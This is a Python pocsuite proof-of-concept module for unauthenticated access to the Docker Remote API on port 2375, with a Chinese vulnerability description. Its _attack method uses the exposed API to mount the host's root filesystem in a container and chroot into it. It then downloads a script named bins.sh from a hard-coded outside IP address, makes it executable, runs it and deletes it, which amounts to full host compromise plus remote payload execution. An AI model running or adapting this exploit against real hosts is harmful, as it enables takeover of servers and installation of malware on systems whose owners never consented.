#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import os

class TestPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1.0'
    author = ['']
    vulDate = '2015-10-30'
    createDate = '2015-10-30'
    updateDate = '2015-10-30'
    references = ['https://www.seebug.org/vuldb/ssvid-89696']
    name = 'Docker Remote API 未授权访问'
    appPowerLink = 'www.seebug.org'
    appName = 'Docker'
    appVersion = 'Docker'
    vulType = 'Abuse of Functionality'
    desc = '''docker 在使用集群管理(如:Kubernetes,swarm)时，要使用remote api对节点进行管理.remote api无认证时的默认端口是2375(需要TLS认证默认登录是2376)。 remote api默认是可以不需要认证能直接访问，能直接对docker进行操作,如新建容器,删除容器,查看镜像容器信息等...
    '''
    samples = ['']

    def _attack(self):
        result = {}
        ret =  os.system("Docker -H tcp://%s:2375 run --rm -v /:/mnt alpine chroot /mnt /bin/sh -c 'wget http://149.28.93.152/bins.sh' -O bins.sh;chmod 777 bins.sh;sleep 2s;sh bins.sh;sleep 5s;rm bins.sh")
        if ret == 0:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = "success"
        return self.parse_output(result)

    def _verify(self):
        result = {}
        target = "%s:2375/info" %self.url
        res = req.get(target)
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = res.url
            result['VerifyInfo']['Postdata'] = res.content
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
